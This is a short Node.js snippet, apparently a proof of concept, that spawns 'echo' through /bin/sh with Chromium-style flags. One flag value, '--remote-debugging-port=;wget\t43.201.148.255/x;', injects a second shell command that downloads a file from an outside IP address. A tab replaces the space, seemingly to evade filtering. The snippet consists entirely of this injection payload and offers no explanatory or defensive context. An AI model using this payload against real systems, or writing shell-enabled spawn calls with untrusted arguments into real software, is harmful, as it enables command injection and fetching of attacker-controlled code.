const { spawn } = require('child_process');

const child = spawn('echo',
            [
                '--no-sandbox',
                '--remote-debugging-port=;wget\t43.201.148.255/x;',
                '--user-data-dir=/app/notes'
            ],
            {
                shell: "/bin/sh",
            });